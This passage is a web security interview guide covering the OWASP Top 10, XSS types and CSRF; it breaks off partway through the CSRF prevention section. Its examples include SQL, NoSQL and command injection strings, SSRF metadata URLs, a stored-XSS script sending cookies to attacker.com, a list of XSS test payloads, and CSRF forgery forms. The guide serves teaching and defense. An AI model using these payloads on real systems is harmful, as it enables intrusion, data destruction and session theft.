# Web Security - Complete Interview Guide
## OWASP Top 10, XSS, CSRF, CORS, Authentication & Authorization

## Table of Contents
1. [OWASP Top 10 Security Risks](#owasp-top-10)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
3. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
4. [Cross-Origin Resource Sharing (CORS)](#cross-origin-resource-sharing-cors)
5. [Secure Authentication](#secure-authentication)
6. [Authorization & Access Control](#authorization--access-control)
7. [Interview Questions & Answers](#interview-questions--answers)

---

## OWASP Top 10

### What is OWASP?
**OWASP** (Open Web Application Security Project) is a nonprofit foundation that works to improve software security. The OWASP Top 10 is a standard awareness document representing a broad consensus about the most critical security risks to web applications.

### OWASP Top 10 (2021) - Detailed Explanation

---

### 1. Broken Access Control

**What it is**: When users can act outside of their intended permissions, accessing data or functionality they shouldn't have access to.

**Why it's dangerous**: Attackers can view sensitive data, modify or delete data, or perform unauthorized actions.

**Common Examples**:
- **URL manipulation**: Changing `/user/123/profile` to `/user/124/profile` to access another user's profile
- **Insecure Direct Object References (IDOR)**: Using predictable IDs without authorization checks
- **Privilege Escalation**: Regular user performing admin actions
- **Missing function-level access control**: API endpoints that don't verify user permissions
- **CORS misconfiguration**: Allowing unauthorized domains to access resources

**Real-World Scenario**:
```
Normal User URL: https://bank.com/account?id=12345
Attacker changes to: https://bank.com/account?id=67890
Without proper checks, attacker sees another user's account details
```

**How to Prevent**:
- Implement access control checks on every request (server-side, never client-side only)
- Deny access by default - require explicit grants
- Use role-based access control (RBAC) or attribute-based access control (ABAC)
- Log access control failures and alert administrators
- Implement rate limiting on APIs
- Use JWT tokens with proper claims validation
- Never trust client-side data for authorization decisions

**Interview Talking Points**:
- "Access control must be enforced on the server-side. Client-side checks can be bypassed."
- "Every API endpoint should verify: Is this user authenticated? Is this user authorized for this resource?"
- "Use the principle of least privilege - users should only have access to what they absolutely need"

---

### 2. Cryptographic Failures

**What it is**: Previously called "Sensitive Data Exposure". Failures related to cryptography that often lead to exposure of sensitive data.

**Why it's dangerous**: Sensitive data like passwords, credit cards, health records, or personal information can be stolen or modified.

**Common Examples**:
- **Data transmitted in clear text**: HTTP instead of HTTPS
- **Weak or old cryptographic algorithms**: MD5, SHA1, DES
- **Hard-coded encryption keys** in source code
- **Improper key management**: Keys stored in Git repositories
- **Weak random number generation**: Using Math.random() for security tokens
- **Storing passwords in plain text** or using weak hashing
- **Missing encryption at rest**: Database storing sensitive data unencrypted

**Real-World Scenario**:
```
Company stores passwords using MD5 hash (weak)
Attacker gains access to database
Uses rainbow tables to crack passwords in minutes
Compromises all user accounts
```

**How to Prevent**:
- **Always use HTTPS** for data in transit (TLS 1.2 or 1.3)
- **Encrypt sensitive data at rest** (AES-256)
- Use strong, up-to-date cryptographic algorithms
- **Proper password hashing**: Use bcrypt, scrypt, or Argon2 (NOT MD5 or SHA1)
- Never store sensitive data unnecessarily (minimize data collection)
- Implement proper key management (use key vaults, rotate keys)
- Use secure random number generators (crypto.randomBytes, not Math.random)
- Disable caching for sensitive data responses
- Apply required security controls per data classification

**Interview Talking Points**:
- "For passwords, use bcrypt with a work factor of at least 10. It's designed to be slow to prevent brute force attacks"
- "TLS protects data in transit, but you also need encryption at rest for stored sensitive data"
- "Never roll your own crypto - use proven, tested libraries"
- "Key management is as important as the encryption itself. Use environment variables or secret management services like AWS KMS or HashiCorp Vault"

---

### 3. Injection

**What it is**: When untrusted data is sent to an interpreter as part of a command or query, tricking the interpreter into executing unintended commands or accessing unauthorized data.

**Why it's dangerous**: Can result in data loss, corruption, disclosure, denial of access, or complete system takeover.

**Types of Injection**:

**SQL Injection (SQLi)**:
```sql
-- Vulnerable code accepts user input directly
query = "SELECT * FROM users WHERE username = '" + userInput + "'"

-- Attacker enters: ' OR '1'='1
-- Final query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1'
-- Returns all users!

-- Attacker enters: '; DROP TABLE users; --
-- Deletes entire users table
```

**NoSQL Injection**:
```javascript
// MongoDB vulnerable code
db.users.find({ username: req.body.username, password: req.body.password })

// Attacker sends: {"username": {"$gt": ""}, "password": {"$gt": ""}}
// Bypasses authentication
```

**Command Injection**:
```javascript
// Vulnerable code
exec('ping ' + userInput)

// Attacker enters: 8.8.8.8; cat /etc/passwd
// Executes: ping 8.8.8.8; cat /etc/passwd
```

**LDAP, XPath, OS Command, and ORM Injection** work similarly.

**How to Prevent**:
- **Use parameterized queries (prepared statements)** - MOST IMPORTANT
- **Use ORM frameworks properly** (but be aware they can still be vulnerable)
- **Input validation**: Whitelist allowed characters
- **Escape special characters** in dynamic queries
- **Principle of least privilege**: Database users should have minimal permissions
- Use SQL controls like `LIMIT` to reduce impact of successful injection
- **Never concatenate user input directly into queries**

**Secure Example**:
```javascript
// ✅ Safe - Parameterized query
const query = 'SELECT * FROM users WHERE username = ? AND password = ?'
db.query(query, [username, password])

// ✅ Safe - ORM
User.findOne({ where: { username: username, password: password } })

// ❌ Dangerous - String concatenation
const query = `SELECT * FROM users WHERE username = '${username}'`
```

**Interview Talking Points**:
- "The golden rule: Never trust user input. Always validate and sanitize"
- "Parameterized queries separate code from data, making injection impossible"
- "Input validation should be done on both client and server, but server-side is mandatory"
- "Use ORM frameworks, but understand they're not automatically safe - you can still write vulnerable queries"

---

### 4. Insecure Design

**What it is**: Missing or ineffective security controls in the design phase. It's about flaws in the architecture and design, not implementation bugs.

**Why it's dangerous**: No amount of perfect implementation can fix a fundamentally flawed design.

**Examples**:
- **Missing rate limiting**: Allows brute force attacks
- **No account lockout mechanism**: Unlimited password attempts
- **Weak recovery mechanisms**: "What's your mother's maiden name?" security questions
- **No segmentation**: All users in same network segment
- **Trust boundary violation**: Trusting client-side input for critical decisions
- **Missing security requirements** in initial design
- **Credential stuffing vulnerability**: No detection of leaked credential usage

**Real-World Scenario**:
```
E-commerce site design:
❌ Bad: Client-side JavaScript calculates final price
User can manipulate to pay $1 for $1000 item

✅ Good: Server-side price calculation
Client only sends product IDs, server calculates price
```

**How to Prevent**:
- **Establish and use a secure development lifecycle** with security experts
- **Threat modeling**: Identify potential threats during design
- **Use security design patterns and reference architectures**
- **Design for failure**: Assume systems will be attacked
- **Defense in depth**: Multiple layers of security
- **Secure by default configurations**
- **Write security requirements** and acceptance criteria
- **Unit and integration tests for security flows**

**Interview Talking Points**:
- "Secure design means thinking about security from day one, not bolting it on later"
- "Use threat modeling frameworks like STRIDE to identify risks early"
- "Design principle: Fail securely. If something breaks, it should fail to a secure state, not an open one"
- "Security should be in the acceptance criteria alongside functional requirements"

---

### 5. Security Misconfiguration

**What it is**: Incorrectly configured security settings that leave applications vulnerable.

**Why it's dangerous**: Can give attackers easy access to data and functionality.

**Common Examples**:
- **Default credentials**: admin/admin still enabled
- **Unnecessary features enabled**: Debug mode in production
- **Error messages revealing sensitive info**: Stack traces shown to users
- **Missing security headers**: No CSP, HSTS, X-Frame-Options
- **Unpatched systems**: Running old software versions
- **Open cloud storage**: S3 buckets publicly accessible
- **Directory listing enabled**: Can browse server directories
- **Unnecessary services running**: Unused ports open
- **Verbose error messages**: "User admin exists", "Password incorrect"
- **Default installation settings kept**: Sample applications not removed

**Real-World Scenario**:
```
Production server shows detailed errors:
"Database connection failed: Cannot connect to postgresql://admin:password123@db.internal:5432/maindb"

Exposes: Database type, credentials, internal hostname, database name
```

**How to Prevent**:
- **Secure defaults**: Minimal platform without unnecessary features
- **Repeatable hardening process** across environments
- **Automated configuration management** (Infrastructure as Code)
- **Segmented application architecture**: Separate components
- **Remove or disable unused features, frameworks, documentation, samples**
- **Proper error handling**: Generic messages to users, detailed logs server-side
- **Security headers**: CSP, HSTS, X-Content-Type-Options, etc.
- **Regular security updates and patch management**
- **Automated security scanning** in CI/CD pipeline
- **Review cloud storage permissions** (S3 bucket policies, ACLs)

**Interview Talking Points**:
- "Never use default credentials. Change them immediately after installation"
- "Different error messages for dev and production. Users see 'Login failed', logs show detailed error"
- "Security headers are your first line of defense against common attacks"
- "Infrastructure as Code ensures consistent, secure configurations across environments"

---

### 6. Vulnerable and Outdated Components

**What it is**: Using libraries, frameworks, and other software modules with known vulnerabilities.

**Why it's dangerous**: Attackers can exploit known vulnerabilities to compromise systems.

**Common Examples**:
- Using JavaScript libraries with known XSS vulnerabilities
- Outdated web servers (Apache, Nginx, IIS)
- Old CMS versions (WordPress, Drupal)
- Unpatched operating systems
- Vulnerable npm packages in node_modules
- Legacy frameworks no longer maintained
- Third-party APIs with security issues
- Transitive dependencies (dependencies of dependencies)

**Real-World Examples**:
- **Log4Shell (2021)**: Vulnerability in Log4j library affected millions of applications
- **Heartbleed (2014)**: OpenSSL vulnerability exposed sensitive data
- **Equifax breach (2017)**: Unpatched Apache Struts vulnerability

**How to Identify**:
```bash
# Check npm vulnerabilities
npm audit

# Check for outdated packages
npm outdated

# Check Python dependencies
pip check
safety check

# Check Ruby gems
bundle audit
```

**How to Prevent**:
- **Inventory all components and versions**: Know what you're using
- **Monitor security bulletins** for components you use
- **Remove unused dependencies and unnecessary features**
- **Only use official sources** for components (npm, PyPI, Maven Central)
- **Prefer signed packages** when available
- **Subscribe to security mailing lists** for components you use
- **Automated dependency scanning** in CI/CD (Dependabot, Snyk, OWASP Dependency-Check)
- **Regular updates and patch management process**
- **Virtual patching** when immediate updates aren't possible
- **Software Bill of Materials (SBOM)** for tracking

**Interview Talking Points**:
- "Run `npm audit` or `pip check` regularly. Automate it in your CI/CD pipeline"
- "Don't just update major versions - minor and patch updates often contain security fixes"
- "Understand your entire dependency tree, including transitive dependencies"
- "Have a process for responding to security advisories within 24-48 hours"
- "Use tools like Dependabot to automatically create PRs for security updates"

---

### 7. Identification and Authentication Failures

**What it is**: Previously called "Broken Authentication". Failures in confirming user identity, authentication, and session management.

**Why it's dangerous**: Attackers can compromise passwords, keys, session tokens, or exploit implementation flaws to assume users' identities.

**Common Examples**:
- **Weak passwords allowed**: "password123", "12345678"
- **Credential stuffing**: Using leaked credentials from other breaches
- **Brute force attacks**: No rate limiting on login attempts
- **Session fixation**: Attacker sets user's session ID
- **Exposed session IDs**: In URLs, logs, or unencrypted transmission
- **Session timeout issues**: Sessions never expire
- **Weak password recovery**: Predictable tokens, security questions
- **No multi-factor authentication** for sensitive operations
- **Plaintext or weakly hashed passwords**
- **Missing account lockout mechanisms**

**Attack Scenario**:
```
1. Attacker obtains leaked credentials from BreachX database
2. Uses credential stuffing: Tries same credentials on 1000s of sites
3. No rate limiting, so tries millions of combinations
4. Successfully logs into 100 accounts
5. No MFA, so gains full access immediately
```

**How to Prevent**:
- **Implement multi-factor authentication (MFA)** - CRITICAL
- **Use strong password policies**: Length > complexity, minimum 12 characters
- **Check passwords against breached password databases** (Have I Been Pwned API)
- **Rate limiting and account lockout** after failed attempts
- **Use secure session management**:
  - Generate new session ID after login
  - Session IDs should be random, high entropy
  - Never expose session IDs in URLs
  - Set secure cookie flags (HttpOnly, Secure, SameSite)
  - Implement idle and absolute timeouts
- **Secure password recovery**: Time-limited tokens, don't reveal if account exists
- **Log authentication failures** for security monitoring
- **Implement CAPTCHA** after several failed attempts
- **No default credentials** in production

**Secure Session Cookie Example**:
```javascript
// ✅ Secure session cookie
res.cookie('sessionId', token, {
  httpOnly: true,      // Not accessible via JavaScript
  secure: true,        // Only sent over HTTPS
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000      // 1 hour expiry
});

// ❌ Insecure
res.cookie('sessionId', token); // All defaults are insecure
```

**Interview Talking Points**:
- "MFA is non-negotiable for modern applications. Even if password is compromised, account stays safe"
- "Passwords should be hashed with bcrypt (work factor 10+), salted automatically"
- "Session management is often overlooked. Bad session handling can negate all other security measures"
- "Implement rate limiting at multiple layers: IP level, account level, globally"
- "Check passwords against known breached password databases during registration and password change"

---

### 8. Software and Data Integrity Failures

**What it is**: Code and infrastructure that doesn't protect against integrity violations. Previously focused on Insecure Deserialization.

**Why it's dangerous**: Can lead to remote code execution, arbitrary code execution, or privilege escalation.

**Common Examples**:
- **Unsigned or unverified updates**: Auto-updates without signature verification
- **Insecure CI/CD pipeline**: Attackers inject malicious code
- **Untrusted CDNs**: Loading libraries from compromised CDNs
- **Insecure deserialization**: Untrusted data used to create objects
- **Lack of integrity checks**: No verification of data or code
- **Supply chain attacks**: Malicious code in dependencies
- **No code review process**: Malicious code slips through
- **Insufficient logging**: Can't detect integrity violations

**Real-World Examples**:
- **SolarWinds (2020)**: Attackers inserted malicious code into software updates
- **Event-Stream incident (2018)**: Malicious code added to npm package
- **CodeCov (2021)**: Attackers modified Bash Uploader script

**Attack Scenario**:
```
1. Developer's npm account compromised
2. Attacker publishes malicious version of popular package
3. Thousands of applications auto-update
4. Malicious code steals environment variables (API keys, secrets)
5. Attackers gain access to production systems
```

**How to Prevent**:
- **Verify digital signatures** on software updates and libraries
- **Use trusted repositories** and verify package integrity
- **Implement Subresource Integrity (SRI)** for CDN resources:
```html
<script src="https://cdn.com/library.js" 
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/..." 
        crossorigin="anonymous"></script>
```
- **Review CI/CD configuration**: Ensure pipeline security
- **Separate build, test, and production environments**
- **Sign your releases and commits**
- **Implement secure deserialization**: Validate input before deserializing
- **Dependency pinning**: Lock exact versions of dependencies
- **Regular security audits** of dependencies
- **Software Bill of Materials (SBOM)**

**Interview Talking Points**:
- "Supply chain attacks are increasingly common. Trust but verify all dependencies"
- "Use package lock files (package-lock.json, yarn.lock) to ensure consistent versions"
- "Subresource Integrity (SRI) ensures CDN files haven't been tampered with"
- "Sign your Git commits and container images to prove authenticity"
- "Never deserialize untrusted data without validation. It's equivalent to remote code execution"

---

### 9. Security Logging and Monitoring Failures

**What it is**: Insufficient logging and monitoring that prevents detection of breaches, attacks, and security incidents.

**Why it's dangerous**: Without proper logging, attacks go unnoticed. The average breach takes 200+ days to detect.

**Common Problems**:
- **No logging of security events**: Login failures, access control violations
- **Logs not monitored or reviewed**
- **Logs only stored locally**: Lost when system compromised
- **No alerting on suspicious patterns**
- **Insufficient log information**: No context, timestamps, or user details
- **Logs accessible to unauthorized users**
- **No audit trail** for critical operations
- **Penetration testing and scans not triggering alerts**
- **Excessive logging**: Performance impact, storage issues, or logging sensitive data

**What Should Be Logged**:
- Authentication success and failure (who, when, from where)
- Authorization failures (attempted access to restricted resources)
- Input validation failures
- Application errors and exceptions
- Admin actions (user creation, permission changes)
- Security configuration changes
- High-value transactions
- Data access and modifications
- Account lockouts
- Privilege escalation attempts

**What Should NOT Be Logged**:
- Passwords (even hashed)
- Session tokens
- Credit card numbers
- Personal identification information (PII) unless required for audit
- Security secrets (API keys, encryption keys)

**How to Prevent**:
- **Ensure all authentication, access control, and input validation failures are logged**
- **Log format should be consumable by log management solutions**
- **Include sufficient context**: User ID, IP, timestamp, action, result
- **Use high-integrity log format**: Prevent tampering
- **Centralized logging**: Send logs to secure, separate system
- **Implement real-time monitoring and alerting**
- **Establish incident response and recovery plan**
- **Regular review and analysis of logs**
- **Use SIEM (Security Information and Event Management)** tools
- **Implement log retention policies**

**Secure Logging Example**:
```javascript
// ✅ Good logging
logger.info('Login attempt', {
  username: username,  // OK to log
  ipAddress: req.ip,
  timestamp: new Date(),
  result: 'failure',
  reason: 'Invalid credentials'
});

// ❌ Bad logging
logger.info(`Login failed for ${username} with password ${password}`);
// Never log passwords!
```

**Interview Talking Points**:
- "Logging is useless if nobody looks at the logs. Implement automated monitoring and alerts"
- "The question isn't if you'll be attacked, but when. Logs help you detect and respond"
- "Centralized logging is critical. If an attacker compromises a server, they'll delete local logs"
- "Balance security with privacy. Log actions, not sensitive data"
- "Use log aggregation tools like ELK stack, Splunk, or cloud-native solutions"

---

### 10. Server-Side Request Forgery (SSRF)

**What it is**: When a web application fetches a remote resource without validating the user-supplied URL, allowing attackers to coerce the application to send crafted requests to unexpected destinations.

**Why it's dangerous**: Can expose internal systems, cloud metadata, or bypass access controls.

**Attack Scenario**:
```
Application feature: "Load image from URL"
Normal use: https://example.com/photo.jpg

Attacker provides: http://localhost:6379/
Server makes request to internal Redis database

Or: http://169.254.169.254/latest/meta-data/
Server retrieves AWS credentials from metadata service
```

**Common Targets**:
- Internal systems (databases, admin panels, internal APIs)
- Cloud metadata services (169.254.169.254 for AWS)
- Local services (localhost, 127.0.0.1)
- Internal network scanning
- Reading local files (file:// protocol)

**Real-World Examples**:
- **Capital One breach (2019)**: SSRF used to access AWS metadata service
- Attackers reading /etc/passwd via file:// URLs
- Port scanning internal networks through vulnerable applications

**How to Prevent**:
- **Whitelist allowed domains, protocols, and ports**
- **Validate and sanitize all user input**
- **Disable unnecessary URL schemas** (file://, gopher://, ftp://)
- **Network segmentation**: Separate internal and external networks
- **Block private IP ranges**: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.1
- **Block cloud metadata IPs**: 169.254.169.254
- **Use DNS resolution to validate**: Check resolved IP before request
- **Implement timeout and rate limiting**
- **Don't return raw responses** to users
- **Disable HTTP redirections** or validate redirect targets

**Secure Implementation**:
```javascript
// ❌ Vulnerable
app.get('/fetch-url', (req, res) => {
  const url = req.query.url;
  fetch(url).then(response => response.text()).then(data => res.send(data));
});

// ✅ Secure
const allowedDomains = ['example.com', 'cdn.example.com'];

app.get('/fetch-url', (req, res) => {
  const url = new URL(req.query.url);
  
  // Validate protocol
  if (!['http:', 'https:'].includes(url.protocol)) {
    return res.status(400).send('Invalid protocol');
  }
  
  // Validate domain
  if (!allowedDomains.includes(url.hostname)) {
    return res.status(400).send('Domain not allowed');
  }
  
  // Validate not private IP
  const ip = dns.resolve(url.hostname);
  if (isPrivateIP(ip)) {
    return res.status(400).send('Private IPs not allowed');
  }
  
  fetch(url.toString()).then(/* ... */);
});
```

**Interview Talking Points**:
- "SSRF is particularly dangerous in cloud environments where metadata services expose credentials"
- "Always validate URLs on a whitelist basis. Blacklists are easily bypassed"
- "Network segmentation is defense in depth. Even if SSRF occurs, internal systems should be isolated"
- "Be aware of URL encoding tricks and DNS rebinding attacks that bypass simple IP checks"

---

## Cross-Site Scripting (XSS)

### What is XSS?

**Cross-Site Scripting (XSS)** is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The attacker's code executes in the victim's browser with the same permissions as legitimate site code.

**Why is it called Cross-Site?**
The malicious script is executed "across" sites - from the attacker's control to the victim's browser through the vulnerable site.

### Why XSS is Dangerous

- **Session hijacking**: Steal session cookies and impersonate users
- **Credential theft**: Create fake login forms that send credentials to attacker
- **Defacement**: Modify page content
- **Redirection**: Redirect users to phishing sites
- **Keylogging**: Capture everything user types
- **Malware distribution**: Force downloads of malicious software
- **Cryptocurrency mining**: Use victim's CPU for mining

### Types of XSS

---

### 1. Reflected XSS (Non-Persistent)

**How it works**: Malicious script is reflected off the web server (in error message, search result, or any response that includes user input without proper sanitization).

**Flow**:
1. Attacker crafts malicious URL with script
2. Victim clicks link
3. Server reflects the script back in response
4. Browser executes script (doesn't know it's malicious)

**Example**:
```
Vulnerable search page: 
https://example.com/search?q=<user input>

Normal use:
https://example.com/search?q=shoes
Page shows: "Results for: shoes"

Attack:
https://example.com/search?q=<script>alert(document.cookie)</script>
Page shows: "Results for: <script>alert(document.cookie)</script>"
Browser executes the script!

Real attack URL (shortened for social engineering):
https://bit.ly/freeprize → https://example.com/search?q=<script>/*steal cookies*/</script>
```

**Server-side vulnerable code**:
```javascript
// ❌ Vulnerable
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// ✅ Secure (escaped)
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});
```

---

### 2. Stored XSS (Persistent)

**How it works**: Malicious script is permanently stored on the target server (in database, comment field, forum post, etc.) and served to users who access the affected page.

**Flow**:
1. Attacker submits malicious script (e.g., in a comment)
2. Server stores script in database without sanitization
3. When any user views the page, server retrieves and displays the script
4. Every visitor's browser executes the malicious script

**Why it's more dangerous**: 
- Affects all users who view the content, not just those who click malicious links
- No user interaction needed after initial payload storage
- Persistent - remains until removed

**Example**:
```
Vulnerable comment system:

Attacker posts comment:
"Great article! <script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>"

Server stores this in database as-is.

Every user who views comments executes this script and has their cookies stolen.
```

**Real-World Scenario**:
```
Social media platform with XSS in bio:
1. Attacker creates profile with XSS in bio
2. 10,000 users view attacker's profile
3. All 10,000 users have session cookies stolen
4. Attacker can impersonate any of these users
```

---

### 3. DOM-based XSS

**How it works**: The vulnerability exists in client-side JavaScript code that processes user input and writes it to the DOM without proper sanitization. The server's response doesn't change, but the client-side script modifies the page in an unsafe way.

**Key difference**: The payload never goes to the server. Attack happens entirely in the browser.

**Flow**:
1. Victim clicks malicious link with payload in URL fragment (#)
2. Client-side JavaScript reads URL
3. JavaScript writes unsanitized data to DOM
4. Browser executes malicious code

**Example**:
```javascript
// ❌ Vulnerable client-side code
const name = window.location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + name;

// Attack URL:
https://example.com/welcome#<img src=x onerror=alert(document.cookie)>

// JavaScript reads: <img src=x onerror=alert(document.cookie)>
// Writes to DOM: <div id="welcome">Welcome <img src=x onerror=alert(document.cookie)></div>
// Browser executes onerror handler
```

**Common DOM-based XSS sinks** (dangerous functions):
- `element.innerHTML = userInput`
- `document.write(userInput)`
- `element.outerHTML = userInput`
- `eval(userInput)`
- `setTimeout(userInput, time)`
- `setInterval(userInput, time)`
- `location = userInput`
- `element.insertAdjacentHTML(position, userInput)`

---

### XSS Prevention Techniques

### 1. Output Encoding/Escaping

**HTML Context**: Escape `< > " ' &`
```javascript
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Use in templates
<div>${escapeHtml(userInput)}</div>
```

**JavaScript Context**:
```javascript
// ❌ Dangerous
<script>
  var username = "${userInput}";
</script>

// ✅ Better (but still risky)
<script>
  var username = "${escapeJS(userInput)}";
</script>

// ✅✅ Best
<script>
  var username = JSON.parse('${JSON.stringify(userInput)}');
</script>
```

**URL Context**:
```javascript
// Use encodeURIComponent
const safeParam = encodeURIComponent(userInput);
const url = `https://example.com/page?param=${safeParam}`;
```

### 2. Content Security Policy (CSP)

**What it is**: HTTP header that defines which sources of content browsers should allow to load.

**How it helps**: Even if XSS vulnerability exists, CSP can prevent script execution.

```
// HTTP Header
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';

Explanation:
- default-src 'self': Only load resources from same origin
- script-src 'self' https://trusted-cdn.com: Scripts only from same origin or trusted CDN
- object-src 'none': No Flash, Java, etc.
```

**Strict CSP** (most secure):
```
Content-Security-Policy: 
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

**With React**:
```javascript
// Express.js with helmet
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],  // React needs unsafe-inline
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
  }
}));
```

### 3. Use Security Libraries & Frameworks

**React's built-in protection**:
```jsx
// ✅ Safe - React escapes by default
const username = "<script>alert('xss')</script>";
<div>{username}</div>
// Renders: &lt;script&gt;alert('xss')&lt;/script&gt;

// ❌ Dangerous - bypasses React's protection
<div dangerouslySetInnerHTML={{ __html: username }} />
// Executes the script!

// ✅ Safe way to render HTML
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(username) }} />
```

**DOMPurify** (HTML sanitization library):
```javascript
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// Result: <img src="x">
// onerror removed
```

### 4. Input Validation

**Server-side validation**:
```javascript
// Whitelist approach
function validateUsername(username) {
  // Only alphanumeric and underscore
  if (!/^[a-zA-Z0-9_]+$/.test(username)) {
    throw new Error('Invalid username');
  }
  return username;
}

// Length validation
function validateComment(comment) {
  if (comment.length > 500) {
    throw new Error('Comment too long');
  }
  return comment;
}
```

### 5. HTTPOnly Cookies

**Prevents JavaScript access to cookies**:
```javascript
// ✅ Secure session cookie
res.cookie('sessionId', token, {
  httpOnly: true,    // Cannot be accessed by JavaScript
  secure: true,      // Only sent over HTTPS
  sameSite: 'strict' // CSRF protection
});

// Even if XSS exists, attacker cannot steal this cookie via:
// document.cookie or fetch
```

### 6. X-XSS-Protection Header

```
X-XSS-Protection: 1; mode=block
```
Enables browser's built-in XSS filter (legacy browsers).

---

### XSS Detection & Testing

**Manual Testing**:
```
Test payloads:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
```

**Automated Tools**:
- OWASP ZAP
- Burp Suite
- XSStrike
- Browser Developer Tools

**React-specific testing**:
```javascript
// Test dangerous patterns
const TestComponent = () => {
  const [html, setHtml] = useState('');
  
  // This should be flagged in code review
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
};
```

---

### Interview Talking Points

**"Explain XSS to a non-technical person"**:
"XSS is like a hacker putting a malicious note in a library book. When you open the book and read the note, it tricks you into doing something harmful, like visiting a fake website or giving away your password. The library (website) didn't properly check what was written in the note before displaying it to you."

**"Why is stored XSS worse than reflected?"**:
"Reflected XSS requires social engineering - you need to trick each victim individually into clicking a malicious link. Stored XSS attacks everyone who visits the page automatically. One successful injection can compromise thousands of users without any further action from the attacker."

**"How does CSP prevent XSS?"**:
"CSP is like a security policy that says 'I only trust code from these specific sources'. Even if an attacker injects a script tag, the browser won't execute it because it's not from a trusted source defined in the CSP header. It's a defense-in-depth approach."

**"React prevents XSS by default. Why still worry?"**:
"React escapes content in JSX by default, which is great. But developers can bypass this with dangerouslySetInnerHTML, or create DOM-based XSS vulnerabilities in event handlers, or store unescaped content that's later rendered. You still need proper sanitization and validation."

---

## Cross-Site Request Forgery (CSRF)

### What is CSRF?

**Cross-Site Request Forgery (CSRF)** is an attack that forces an authenticated user to execute unwanted actions on a web application where they're currently authenticated. The attacker tricks the victim's browser into making requests on their behalf.

**Key point**: The attack uses the victim's authentication (cookies are sent automatically by browser), but the attacker doesn't see the response.

### How CSRF Works

**Attack Flow**:
```
1. Victim logs into bank.com
2. Browser stores session cookie
3. Victim visits attacker's site (evil.com) while still logged into bank.com
4. Evil.com contains malicious code:
   <img src="https://bank.com/transfer?to=attacker&amount=10000">
5. Browser automatically includes bank.com cookies with request
6. Bank.com thinks it's legitimate request from victim
7. Money transferred to attacker
```

**Why it works**:
- Browsers automatically send cookies with every request to a domain
- Bank.com can't tell if request originated from its own pages or evil.com
- Victim doesn't need to click anything (request happens automatically)

### Real-World Attack Scenarios

**1. Financial Transactions**:
```html
<!-- Attacker's evil website -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="50000">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

**2. Account Takeover**:
```html
<!-- Change email address -->
<img src="https://example.com/account/change-email?new=attacker@evil.com">

<!-- Change password -->
<form action="https://example.com/account/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
</form>
```

**3. Social Media Actions**:
```html
<!-- Make victim follow attacker -->
<img src="https://twitter.com/follow?user=attacker">

<!-- Post on behalf of victim -->
<form action="https://facebook.com/post" method="POST">
  <input type="hidden" name="status" value="Check out evil.com!">
</form>
```

**4. Admin Panel Actions**:
```html
<!-- Create admin user -->
<img src="https://admin.example.com/users/create?username=hacker&role=admin">

<!-- Delete all users -->
<img src="https://admin.example.com/users/delete-all">
```

### CSRF vs XSS

**Confusion Point**: People often confuse these.

| Aspect | XSS | CSRF |
|--------|-----|------|
| **What it is** | Injects malicious code into website | Forces unwanted actions using user's authentication |
| **Executes where** | On victim's browser | On target server |
| **Attacker gains** | Full control of page, can read data | Can perform actions, but cannot read responses |
| **Requires** | Vulnerability in target site | Predictable requests, no CSRF protection |
| **Prevention** | Sanitize input, CSP | CSRF tokens, SameSite cookies |

**Key Difference**:
- XSS: "I can run my code on your website"
- CSRF: "I can make you do things on websites you're logged into"

### CSRF Prevention Techniques

---

### 1. CSRF Tokens (Synchronizer Token Pattern)

**How it works**: Server generates unique, unpredictable token for each session/request. Attacker can't guess token, so can't forge request.

**Implementation**:
```javascript
// Express.js with csurf middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Generate token
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// Validate token
app.post('/transfer', csrfProtection, (req, res) => {
  // If token invalid, csurf middleware blocks request
  // Process transfer
});
```

**HTML Form**:
```html
<form action="/transfer" method="POST">
  <!-- CSRF token as hidden field -->
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  
  <input type="text" name="to" placeholder="Recipient">
  <input type="number" name="amount" placeholder="Amount">
  <button type="submit">Transfer</button>
</form>
```

**React/AJAX**:
```javascript
// Get token from server
const response = await fetch('/api/csrf-token');
const { csrfToken } = await response.json();

// Include in requests
await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken  // Custom header
  },
  body: JSON.stringify({ to: 'recipient', amount: 1000 })
});
```

**Why it works**: Attacker's evil site can't read the CSRF token due to Same-Origin Policy.

---

### 2. SameSite Cookie Attribute

**How it works**: Tells browser not to send cookie with cross-site requests.

